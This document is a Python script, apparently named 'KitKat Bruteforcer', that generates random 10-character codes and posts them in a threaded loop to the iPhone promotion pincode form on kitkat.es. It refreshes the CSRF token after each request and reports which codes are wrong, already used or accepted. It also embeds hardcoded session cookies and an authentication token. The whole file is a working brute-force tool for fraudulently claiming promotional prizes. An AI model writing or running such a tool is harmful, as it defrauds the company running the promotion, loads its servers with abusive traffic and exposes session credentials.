import requests
import random
from time import sleep
import string
import traceback
import datetime
import sys
import threading
try:
    from colorama import init, Fore, Back, Style
    from bs4 import BeautifulSoup
except:
    print('Missing Colorama and BeautifulSoup4 modules!\n')
    sys.exit()
logo = ''' _   ___ _     _   __      _   
| | / (_) |   | | / /     | |  
| |/ / _| |_  | |/ /  __ _| |_ 
|    \| | __| |    \ / _` | __|
| |\  \ | |_  | |\  \ (_| | |_ 
\_| \_/_|\__| \_| \_/\__,_|\__|
______            _        __                        
| ___ \          | |      / _|                       
| |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ _ __ 
| ___ \ '__| | | | __/ _ \  _/ _ \| '__/ __/ _ \ '__|
| |_/ / |  | |_| | ||  __/ || (_) | | | (_|  __/ |   
\____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|_|                Made with ♥ by zDeus
'''

print(Fore.CYAN+logo+Style.RESET_ALL+"\n")
init()

def printUsage():
    print(f'''Usage:    python3 {sys.argv[0]} [random/specific] [threads (BETA)]
Example:  python3 {sys.argv[0]} specific 2\n\n{Fore.RED}[$] More than 1 or 2 threads doesn't usually work.{Style.RESET_ALL}\n{Fore.CYAN}[$] Random mode generates a random string with numbers, uppercase and lowercase letters.\n[$] Specific mode generates a string with 6 uppercase letters, 3 lowercase letters and 1 number.{Style.RESET_ALL}\n''')
    sys.exit()

if len(sys.argv) != 3:
    printUsage()
    
else:
    if sys.argv[1] == 'random':
        def getCode():
            code = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=10))
            return code

    elif sys.argv[1] == 'specific':
        def getCode():
            upper = ''.join(random.choices(string.ascii_uppercase, k=6))
            lower = ''.join(random.choices(string.ascii_lowercase, k=3))
            num = ''.join(random.choices(string.digits, k=1))
            code = upper+lower+num
            code = ''.join(random.sample(code,len(code)))
            return code
    else:
        printUsage()
    try:    
        threads = int(sys.argv[2])
    except:
        printUsage()
        sys.exit()
        
def getCode():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=3))
    num = ''.join(random.choices(string.digits, k=1))

    code = upper+lower+num
    code = ''.join(random.sample(code,len(code)))
    return code

def getTime():
    now = datetime.datetime.now()
    if now.hour < 10:
        hours = '0'+str(now.hour)
    else:
        hours = now.hour
    if now.minute < 10:
        minutes = '0'+str(now.minute)
    else:
        minutes = now.minute
    if now.second < 10:
        seconds = '0'+str(now.second)
    else:
        seconds = now.second
    time = Fore.YELLOW+'['+str(hours)+':'+str(minutes)+':'+str(seconds)+']'+Style.RESET_ALL
    return time

url = 'https://www.kitkat.es/promo-iphone/pincode'

headers = {
    "Host": "www.kitkat.es",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.kitkat.es",
    "Accept-Encoding": "gzip, deflate, br",
    'Cookie': '__utmvapRuoVmP=STd; __utmvaDRuoVmP=ZmQ; _fbp=fb.1.1595455077323.1915030075; _ga=GA1.2.1709720834.1595466671; _gid=GA1.2.2111114351.1595466671; incap_ses_507_346352=YN/tex65LC+I56lG7DkJB5P2GF8AAAAAdqDtrxpmamiYRQXS4ObW+w==; visid_incap_346352=ijzmO5geQ1qhOhnOEoKXMGC2GF8AAAAAQUIPAAAAAADUcp5Bi2v5YY4uxbkuELqp; kppid_managed=kppid_NigE1p-e; _dc_gtm_UA-27534376-1=1; _dc_gtm_UA-50092604-3=1; _dc_gtm_UA-59341526-1=1; _gat_localTracker=1; incap_ses_486_346352=5DBSAfYtljm17R5xhp6+Bpb2GF8AAAAA1iFZj7GTstbXXz11pjueLA==; PHPSESSID=3neafj2kp0h7j2cut873k846f7; incap_ses_505_346352=bHmzAT8u0gWQ3kul8x4CB7jjGF8AAAAAESsCt3iXiy4p6WqBErCB1A==; KITKAT_AUTH_TOKEN=2977fd70-fc88-44f7-a38b-2e9bcbf60938; _gcl_au=1.1.397024509.1595455076; _evidon_consent_cookie={"consent_date":"2020-07-22T21:57:56.212Z","consent_type":1}; incap_ses_508_346352=Ps5KTp2nKEg7F2enYccMB2C2GF8AAAAAuG5ZpYdnIL+dgL8hvI1sog==',
    "Connection": "keep-alive",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
    "Referer": "https://www.kitkat.es/promo-iphone/pincode",
    "Content-Length": "121",
    "Accept-Language": "es-es",
}

body = {
    "csrf": "cae74c690a3f40685c859861248821dd18904dd8f335de2a9bcef7e321e611a506097800fac1a66f",
    "pincode": "TT8dmGWZmC",
    "acceptTerms": "true"
}

try:
    response = requests.post(url, data=body, headers=headers)
except:
    print(f'{getTime()} {Fore.BLACK + Back.WHITE}[!] There\'s no Internet connection!' + Style.RESET_ALL + '\n')
    sys.exit()
text = response.text
soup = BeautifulSoup(text, 'lxml')
try:
    csrf = soup.find("input", {"name":"csrf"})['value']
except TypeError:
    print(f'{getTime()} {Fore.BLACK + Back.WHITE}[!] You didn\'t set the cookies! {Style.DIM}Change line 95 with your \'Cookies\' header value.{Style.RESET_ALL}')
    sys.exit()

def worker(headers=headers, csrf=csrf, code=getCode()):
    try:
        while True:
            now = datetime.datetime.now()
            if now.hour < 10:
                hours = '0'+str(now.hour)
            else:
                hours = now.hour
            if now.minute < 10:
                minutes = '0'+str(now.minute)
            else:
                minutes = now.minute
            if now.second < 10:
                seconds = '0'+str(now.second)
            else:
                seconds = now.second
            code = getCode()
            body = {
                "csrf": csrf,
                "pincode": code,
                "acceptTerms": "true"
            }

            try:
                response = requests.post(url, data=body, headers=headers)
            except KeyboardInterrupt:
                break
            except:
                print(f'{getTime()} {Fore.BLACK + Back.WHITE}[!] An error has occurred in the request!' + Style.RESET_ALL + '\n\n')
                sleep(5)
            try:
                text = response.text
                soup = BeautifulSoup(text, 'lxml')
                csrf = soup.find("input", {"name":"csrf"})['value']

                if 'Lo sentimos' in text:
                    print(f'{getTime()}{Fore.BLACK + Back.WHITE} [!] Request failed!' + Style.RESET_ALL)
                elif 'ya ha sido utilizado' in text:
                    print(f'{getTime()}{Fore.MAGENTA} [~] Code {Fore.BLUE + Style.BRIGHT + code + Style.RESET_ALL + Fore.MAGENTA} already used!' + Style.RESET_ALL)
                elif 'El código no es correcto' in text:
                    print(f'{getTime()}{Fore.RED} [-] The code {Fore.BLUE + Style.BRIGHT + code + Style.RESET_ALL + Fore.RED} is wrong!' + Style.RESET_ALL)
                else:
                    print(f'{getTime()}{Fore.GREEN} [+] Code {Fore.BLUE + Style.BRIGHT + code + Style.RESET_ALL + Fore.GREEN} sent!' + Style.RESET_ALL + '\n')
            except KeyboardInterrupt:
                break
            except:
                print(f'{getTime()} {Fore.BLACK + Back.WHITE}[!] An unexpected error has occurred!' + Style.RESET_ALL + '\n\n')
                traceback.print_exc()
                sleep(5)
    except KeyboardInterrupt:
        sys.exit()

for th in range(threads):
    thread = threading.Thread(target=worker)
    thread.start()